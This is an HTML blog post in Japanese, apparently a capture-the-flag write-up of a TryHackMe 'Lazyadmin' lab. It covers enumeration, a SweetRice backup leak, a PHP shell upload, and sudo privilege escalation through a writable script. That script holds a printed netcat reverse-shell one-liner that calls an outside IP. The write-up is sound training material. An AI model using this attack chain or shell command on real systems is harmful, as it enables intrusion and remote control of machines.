@@ -1,0 +1,221 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Lazyadmin // お茶は綾鷹派</title>
+    <link rel="shortcut icon" href="../../favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.117.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="KoheiDoi" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="../../css/main.min.3fb9065bb18f896621f7ce2fad5bbbafdf9954fbe571b5e41c6e59a8cbacc8ef.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Lazyadmin"/>
+<meta name="twitter:description" content="enum nmap 22:ssh 80:http gobuster content user.txt searchsploit sweetrice cat /usr/share/exploitdb/exploits/php/webapps/40718.txt You can access to all mysql backup and download them from this directory. http://localhost/inc/mysql_backup and can access to website files backup from: http://localhost/SweetRice-transfer.zip mysql のバックアップ？に接続できるらしい http://10.10.61.5/content/inc/mysql_backup/ manager とパスワードのハッシュが見つかる Arbitary file upload みたいなのを実行する http://10.10.61.5/content/attachment/./shell.php5 に php が出てくるのでアクセスするとリバースシェルを獲得できる root.txt sudo -l $ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup."/>
+
+    <meta property="og:title" content="Lazyadmin" />
+<meta property="og:description" content="enum nmap 22:ssh 80:http gobuster content user.txt searchsploit sweetrice cat /usr/share/exploitdb/exploits/php/webapps/40718.txt You can access to all mysql backup and download them from this directory. http://localhost/inc/mysql_backup and can access to website files backup from: http://localhost/SweetRice-transfer.zip mysql のバックアップ？に接続できるらしい http://10.10.61.5/content/inc/mysql_backup/ manager とパスワードのハッシュが見つかる Arbitary file upload みたいなのを実行する http://10.10.61.5/content/attachment/./shell.php5 に php が出てくるのでアクセスするとリバースシェルを獲得できる root.txt sudo -l $ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://side-realms.github.io/writeup/lazyadmin/" /><meta property="article:section" content="writeup" />
+<meta property="article:published_time" content="2024-03-16T11:11:11+09:00" />
+<meta property="article:modified_time" content="2024-03-16T11:11:11+09:00" />
+
+    <style>
+      .hr1 {
+  position: relative;
+	height: 3px;
+	border-width: 0;
+	background-color: #00bcd4;
+	background-image: -webkit-linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+	background-image: linear-gradient( 135deg, #FD6585 10%, #0D25B9 100%);
+}
+    </style>
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://side-realms.github.io"><img class="app-header-avatar" src="../../images/avatar.jpg" alt="KoheiDoi" /></a>
+      <span class="app-header-title">お茶は綾鷹派</span>
+      <p>最近は颯も好き</p>
+      <p><font size="1">内容の正確性は保証していません🐶</font></p>
+      <nav class="app-header-menu">
+          <font size="5">
+          <a class="app-header-menu-item" href="../../">Home</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../log">log</a>
+          </font>
+          <br>
+            
+          
+          <font size="5">
+          <a class="app-header-menu-item" href="../../treasure/">treasure trove</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <nav class="app-header-menu">
+          <font size="4">
+          <a class="app-header-menu-item" href="../../sound">sound</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../container">container</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../interpreter">interpreter</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../writeup">writeup</a>
+          </font>
+          <br>
+            
+          
+          <font size="4">
+          <a class="app-header-menu-item" href="../../other">other</a>
+          </font>
+          <br>
+      </nav>
+
+      <hr class="hr1">
+      <div class="app-header-social">
+        
+          <a href="https://github.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+      </div>
+      <div class="app-footer-copyright">
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Lazyadmin</h1>
+      </style>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 16, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          1 min read
+        </div>
+      </div>
+      <hr>
+    </header>
+    <div class="post-content">
+      <h3 id="enum">enum</h3>
+<ul>
+<li>nmap
+<ul>
+<li>22:ssh</li>
+<li>80:http</li>
+</ul>
+</li>
+<li>gobuster
+<ul>
+<li>content</li>
+</ul>
+</li>
+</ul>
+<h3 id="usertxt">user.txt</h3>
+<ul>
+<li><code>searchsploit sweetrice</code></li>
+<li><code>cat /usr/share/exploitdb/exploits/php/webapps/40718.txt</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>You can access to all mysql backup and download them from this directory.
+</span></span><span style="display:flex;"><span>http://localhost/inc/mysql_backup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>and can access to website files backup from:
+</span></span><span style="display:flex;"><span>http://localhost/SweetRice-transfer.zip
+</span></span></code></pre></div><ul>
+<li>mysql のバックアップ？に接続できるらしい
+<ul>
+<li><code>http://10.10.61.5/content/inc/mysql_backup/</code></li>
+</ul>
+</li>
+<li>manager とパスワードのハッシュが見つかる</li>
+<li>Arbitary file upload みたいなのを実行する</li>
+<li><code>http://10.10.61.5/content/attachment/./shell.php5</code> に php  が出てくるのでアクセスするとリバースシェルを獲得できる</li>
+</ul>
+<h3 id="roottxt">root.txt</h3>
+<ul>
+<li><code>sudo -l</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on THM-Chal:
+</span></span><span style="display:flex;"><span>env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User www-data may run the following commands on THM-Chal:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat backup.pl
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/perl</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;/etc/copy.sh&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ls -la
+</span></span><span style="display:flex;"><span>rw-r--r-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">47</span> Nov <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">2019</span> backup.pl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ ls -la /etc/copy.sh
+</span></span><span style="display:flex;"><span>-rw-r--rwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">81</span> Nov <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2019</span> /etc/copy.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cat /etc/copy.sh
+</span></span><span style="display:flex;"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 <span style="color:#ae81ff">5554</span> &gt;/tmp/f
+</span></span></code></pre></div><ul>
+<li>copy.sh はユーザで書き換え可能なので (rwx) root で実行されているリバースシェルを書きかえればいい</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}]
+    });
+  });
+</script>
+      
+    </div>
+  </article>
+  <hr>
+  <p>© side-realms All rights reserved.</p>
+
+    </main>
+  </body>
+</html>
